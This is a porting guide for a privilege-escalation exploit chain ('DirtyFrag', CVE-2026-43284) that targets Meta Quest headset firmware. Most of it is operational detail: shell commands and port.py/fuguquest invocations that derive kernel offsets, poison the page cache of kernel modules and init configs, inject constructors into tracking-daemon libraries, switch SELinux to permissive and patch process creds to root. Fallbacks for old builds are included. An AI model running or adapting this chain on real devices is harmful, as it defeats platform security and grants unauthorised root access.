# Porting DirtyFrag-LPE to a new firmware (Quest 3 or Quest Pro)

> **Patched builds:** DirtyFrag (CVE-2026-43284) is fixed at security patch level `2026-06-04`
> (see [README.md](README.md)). `port.py` will still *build a target* from a patched OTA — all the
> offsets extract fine and the kernel layout looks unchanged — but the **primitive itself is dead**,
> so the chain won't complete. Offline porting is therefore **not** sufficient to prove a build
> vulnerable: always confirm the page-cache write actually lands on-device (poison a scratch file in
> `/data/local/tmp`, read it back — if it's unchanged while `/proc/net/xfrm_stat`'s
> `XfrmInStateProtoError` still climbs, the build is patched). `targets/q3_52433670048800520.json` is
> kept as a worked example of a patched target (`"status":"PATCHED"`).

A target is one `targets/<name>.json` + the gathered binaries in `targets/<name>/`. Everything
version- and device-specific lives in that JSON; the `kernel.merged` flag selects the flow, so the
**same orchestrator runs Quest 3 and Quest Pro**. See the Quest Pro section below for the merged
shape. The rest of this file describes the Quest 3 two-carrier flow (carrier `llcc_perfmon.ko` +
cred carrier `usbip-vudc.ko` + `init.insmod.cfg`).

You need **only the exact-build firmware zip** `q3_<build>.zip` — everything (carrier `.ko`, cfg,
kernel→DELTA, libeva/libgralloc + libandroid_servers offsets) is extracted from it. **No device is
required.** A connected `--device` is optional and just skips the 1.2 GB `system` dump (it adb-pulls
`libandroid_servers` instead). Tools: `payload-dumper-go`, `debugfs`, `vmlinux-to-elf`,
`llvm-readelf`/`llvm-nm` (all tool paths live in `toolconf.py` — edit there or set env vars).

The **target name defaults to the zip basename** (`QPro_<build>`, `q3_<build>`) — the naming scheme
used in `targets/`. Override with `--name` if needed.

---

## Automated (recommended)

```
python3 port.py --zip /path/q3_<build>.zip                    # Quest 3 (OTA-only)
```

This extracts boot/vendor/vendor_dlkm(/system when no device), pulls both carriers
(`llcc_perfmon.ko` + `usbip-vudc.ko`) + cfg, runs vmlinux-to-elf to compute the four
**anchor-relative deltas** (`selinux_state`, `find_vpid`, `pid_task`,
`selinux_status_update_setenforce`, all minus `__platform_driver_register`), derives
libeva/libandroid offsets (from `system.img`/vendor, or the device) and the libeva code gap,
reads `build_incremental` from `system.img` build.prop (or the device), then writes
`targets/<zip-basename>.json` + copies the binaries. It removes its multi-GB scratch on exit.

**Verify the draft** before use:
- `kernel.anchor_symbol` = `__platform_driver_register` (the CALL26 inside both carriers' init); the
  four `delta_*_from_anchor` are `<symbol> - __platform_driver_register` (32-bit two's complement).
- `cred_carrier` = a NOT-loaded module with a ≥~180 B `.init.text` and that anchor, whose deps are
  loaded. `usbip-vudc` (408 B init, dep `usbip-core` loaded) works on both Quest builds so far;
  `port.py` warns if it lacks the anchor.
- `cfg.inject_off`/`inject_len` must span whole cfg lines, be ≥ the insmod line, and end **>17 B
  before EOF** (sendfile can't send 17 B past EOF). `0x21`/`54` fits the standard 268-B cfg.
- `libeva.stub_gap_*` is a zero run in an executable segment (≥ ~1.7 KB).

Then run: `fuguquest -t targets/quest3-<short>.json`.

---

## Manual (what `port.py` automates)

```bash
# 1. extract partitions from the exact-build zip
unzip -o q3_<build>.zip payload.bin
payload-dumper-go -p boot,vendor,vendor_dlkm -o out payload.bin

# 2. carriers + cfg  (must be byte-exact to the device -> from the exact build)
debugfs -R "dump /lib/modules/llcc_perfmon.ko targets/<name>/llcc_perfmon.ko" out/vendor_dlkm.img
debugfs -R "dump /lib/modules/usbip-vudc.ko   targets/<name>/usbip-vudc.ko"   out/vendor_dlkm.img
debugfs -R "dump /etc/init.insmod.cfg         targets/<name>/init.insmod.cfg" out/vendor.img
strings -a targets/<name>/llcc_perfmon.ko | grep vermagic        # must == device `cat /proc/version`

# 3. anchor-relative DELTAS from the kernel (all minus __platform_driver_register, KASLR-invariant)
vmlinux-to-elf out/boot.img vmlinux.elf
llvm-nm vmlinux.elf | grep -wE 'selinux_state|__platform_driver_register|find_vpid|pid_task|selinux_status_update_setenforce'
#   delta_selinux_from_anchor  = selinux_state                     - __platform_driver_register
#   delta_findvpid_from_anchor = find_vpid                         - __platform_driver_register
#   delta_pidtask_from_anchor  = pid_task                          - __platform_driver_register
#   delta_ssuse_from_anchor    = selinux_status_update_setenforce  - __platform_driver_register
#   (store each as 32-bit two's complement hex; negatives are fine, cred_patch.S sxtw's them)
llvm-readelf -r targets/<name>/llcc_perfmon.ko    # confirm '.rela.init.text' CALL26 = __platform_driver_register

# 4. libeva / libandroid offsets  (pull the device's own, shell-readable)
adb pull /vendor/lib64/libeva.so ; adb pull /system/lib64/libandroid_servers.so
llvm-readelf -S libeva.so | grep init_array          # -> init_array_off
#   orig_ctor_off = *(u64*)(libeva + init_array_off)   (first ctor)
#   stub_gap_off/size = a >=1.7KB zero run in an executable (r-x) PT_LOAD segment
llvm-readelf -sW libandroid_servers.so | grep NativeInputManager4dumpE   # -> dump_off/size
```

Fill `targets/<name>.json` (copy an existing one as a template). Confirm the device permits the
finit trigger: `adb shell setprop ctl.start insmod_sh` (should be allowed for `shell`).

> Note: across the builds seen so far the **userspace libs are identical** (only the kernel
> changes), so `libeva`/`libandroid`/`cfg`/carrier-layout values carried over unchanged between
> 5234532 and 5243367 — only `vermagic` and `delta_selinux_from_anchor` differed. Still verify.

---

## Quest Pro (merged single-carrier)

Quest Pro's 4.19 kernel needs a different shape, all target-driven (`kernel.merged: true`):

- **struct offsets differ** — `selinux_state.enforcing @ +1` (byte 0 is `disabled`), `task_struct.cred
  @ 0x7e8`. Confirm both from the device's BTF:
  `adb shell su -c 'cat /sys/kernel/btf/vmlinux' > btf.bin && pahole -C selinux_state btf.bin` and
  `pahole -C task_struct btf.bin | grep -w cred`. Set `kernel.enforcing_off` / `kernel.cred_off`.
- **one merged carrier** — the only not-loaded module with a big-enough init is `rdbg` (680 B);
  `llcc_perfmon` is already loaded and the USB-net modules are too small for the 196 B cred-patch. So
  `build_credmod` diff-patches `rdbg` into enforcing=0 + status-sync + cred-patch and it loads once.
  `rdbg`'s init CALL26 anchor is `__platform_driver_register` (same as Q3).
- **1-file ctor injection** — `rdbg` is `vendor_file` (shell can't read it under Enforcing), so it's
  poisoned by an `init_array` ctor injected into `libgralloc.qti.so` (a `same_process_hal_file` lib
  mapped by `trackingservice`, RELR init_array, ~3.7 KB exec gap). The cfg **is** shell-readable under
  Enforcing on QPro, so shell poisons it directly (no 2nd table in the ctor — the 243-entry carrier
  table alone nearly fills the gap).

```
python3 port.py --zip QPro_<build>.zip --name questpro-<short> --merged \
  --carrier rdbg --inject-lib libgralloc.qti.so --enforcing-off 1 --cred-off 0x7e8 --device <SERIAL>
fuguquest -t targets/questpro-<short>.json --postex
```

`port.py --merged` extracts `rdbg` + cfg (QPro keeps modules in `vendor.img:/lib/modules`), computes
the four anchor-relative deltas, derives `libgralloc.qti` init_array/ctor/gap and the
`libandroid_servers::dump` offset, and emits the merged JSON (no `cred_carrier`, adds
`cfg.shell_poison_under_enforcing`). `libandroid_servers` lives in `system` — pass `--device` so it's
pulled via adb (QPro's `system` isn't a standalone payload partition).

**Verify on first run** (static-derived, not yet run on hardware): `module.sig_enforce` off,
`libgralloc.qti.so` shell-readable, `dumpsys input` restarts `trackingservice`, and the injection
stub still fits the lib's gap (`build_inject_stub` errors if not — pick a lib with a bigger gap, e.g.
`libcdsprpc.so`, listed in the target as `inject_lib`).

---

## Quest 3S (merged 5.10 via .text-splice)

Q3S is the Q3 5.10 chain but **has no `usbip-vudc`**, and its only not-loaded patchable module is
`llcc_perfmon` whose `.init.text` is 52 B. So it uses a merged single carrier where the cred+enforcing
patch goes in llcc's large `.text` (build_credmod auto-detects the small `.init.text` and does the
`.text`-splice: repoints `module->init`, plants the ABS64 anchor via a repurposed `.text` reloc).
The 5.10 cfg isn't shell-readable under Enforcing, so the ctor poisons it too (`--cfg-ctor`), and
`libeva`'s gap is too small for the merged carrier — use `libcdsprpc` (bigger gap).

```
python3 port.py --zip q3s_<build>.zip --merged --carrier llcc_perfmon \
  --inject-lib libcdsprpc.so --cfg-ctor
fuguquest -t targets/q3s_<build>.json --adb-root          # or --postex
```

Confirm on-device (as with QPro's gralloc injection): `trackingservice` maps `libcdsprpc` and it's
`same_process_hal_file` (shell-readable). If not, pick another trackingservice-mapped, shell-readable
lib with a ≥ ~3.7 KB exec gap for `--inject-lib`.

---

## Quest 2 (merged 4.19) — including old builds with no data kallsyms

Quest 2 (`hollywood`) is the **same merged single-carrier shape as Quest Pro** — `rdbg` carrier,
`libgralloc.qti.so` ctor injection, shell-direct cfg poison. Recent builds (kernel `4.19.325`,
`52106880xxxxx…52242990xxxxx`) port with the plain QPro invocation:

```
python3 port.py --zip q2_<build>.zip --merged --carrier rdbg \
  --inject-lib libgralloc.qti.so --enforcing-off 1 --cred-off 0x7e8
```

**Old builds need another path.** The oldest dumped build, `50837850062000150`
(kernel **`4.19.157+`**, security patch `2024-02-05` — well before the DirtyFrag fix, so the primitive
is live), breaks two of port.py's assumptions. Both are now handled automatically:

1. **`selinux_state` isn't in kallsyms.** This kernel's `/proc/kallsyms` (hence the vmlinux-to-elf
   symtab) carries **only function symbols — no data symbols — and no BTF**, so `selinux_state`, the
   one *data* symbol the deltas need, is missing and port.py used to die with
   `missing kernel symbols in vmlinux: selinux_state`. port.py now **xrefs it out of the code**:
   `&selinux_state` is baked into every SELinux hook as the first argument (x0) to
   `avc_has_perm_noaudit(&selinux_state, …)`, so `selinux_state_via_xref()` disassembles the kernel,
   finds every `bl avc_has_perm_noaudit`, back-tracks the `adrp x0 / add x0,x0,#imm` that set x0, and
   **majority-votes** the result. On `50837850062000150` all callers agree on `0xffffff800976f8f8`
   (`selinux_vm_enough_memory` / `cred_has_capability` are the cleanest single-call witnesses). Only
   `llvm-objdump` is needed; the fallback triggers **only when the symbol is absent**, so 4.19.325 /
   5.10 ports are byte-for-byte unchanged.

2. **`task_struct->cred` moved.** It's **`0x7e0` on 4.19.157**, not `0x7e8` (4.19.325) — task_struct
   grew 8 B between the point-releases, so the hard-coded QPro value would cred-patch the wrong pointer
   and corrupt memory. port.py now reads it straight out of `commit_creds` (`mrs xN, SP_EL0` →
   current, then the adjacent `real_cred @ a` / `cred @ a+8` load pair). Pass **`--cred-off auto`** to
   trust the derivation, or an explicit value; either way it's **cross-checked against `commit_creds`**
   and a mismatch is flagged. (`enforcing_off` stays `1` — `struct selinux_state {bool disabled;
   bool enforcing; …}` is unchanged; `cred->security` stays `0x78`, confirmed from
   `cred_has_capability`'s `ldr x8,[x0,#120]`.)

```
python3 port.py --zip q2_50837850062000150.zip --merged --carrier rdbg \
  --inject-lib libgralloc.qti.so --enforcing-off 1 --cred-off auto
# -> [xref] selinux_state not in kallsyms -> 0xffffff800976f8f8 (via avc_has_perm_noaudit callers)
# -> [derive] task_struct->cred = 0x7e0 (from commit_creds)
```

The carrier (`rdbg`, 676 B `.init.text`, `__platform_driver_register` anchor), the cfg
(`modprobe|-b *`, identical to newer builds) and `libandroid_servers.so` (dump stub target) all
extract normally — only the kernel-side symbol/offset recovery differed there.

**Userspace injection still needs on-device work on this build** (kernel offsets are done and
self-consistent; the ctor-injection front-end is not). Two more things changed and are flagged in the
target's `status` / `port_notes`:

- **The tracking daemon is `trackingfidelityservice`** (`user system`, `group camera`), not
  `trackingservice`. `services.tracking` is set accordingly. Confirm on-device that a `ctl.restart`
  re-runs it, that its SELinux domain can `open()` the carrier (`rdbg.ko`, `vendor_file`) for the ESP
  page-cache poison, and that it maps the `inject_lib` you pick.
- **No tracking-mapped, shell-readable lib has a big enough exec zero-gap.** The old toolchain packs
  code tightly, so almost every `vendor`/`system` lib has a 3–8 B exec gap; the full merged ctor stub
  is ~3500 B (263 diff bytes × 12 + ~344 B). `libgralloc.qti.so` (552 B) and `libcdsprpc.so` (3328 B)
  both **overflow**. This is now handled by the **split flow** (`fuguquest` auto-selects it when the
  merged stub won't fit the gap; `"split_flow": true` in the target forces it):
  - **Phase A** injects a small **enforcing-only** carrier via the tracking-daemon ctor
    (`build_credmod_ex(enforcing_only)` — 104 B patch → **1904 B stub, fits `libcdsprpc`'s 3328 B
    gap**), loads it, and reaches Permissive. (Unlike Q3's `build_carrier`, this reuses
    `build_credmod`'s ABS64-anchor path, so it works on `rdbg`'s 18-CALL26 `.init.text`.)
  - **Phase B**, now under Permissive/DAC, builds the **full cred carrier** from the same `rdbg`,
    **renames its module** (`rename_module` → `rdbgcp`) so it coexists with the loaded Phase-A `rdbg`,
    pushes it to `/data/local/tmp/uv.ko`, poisons the cfg shell-direct to `insmod` it, and
    `ctl.start insmod_sh` loads it → cred-patch → root. Both patched inits return early (no device
    registration), so the two modules don't conflict.

  Validate the stub sizes offline with `cargo run --example fitcheck` (defaults to this target).
  If Phase A's stub still won't fit on some other build, point `inject_lib` at any tracking-mapped,
  shell-readable lib with a ≥ ~2 KB exec gap.
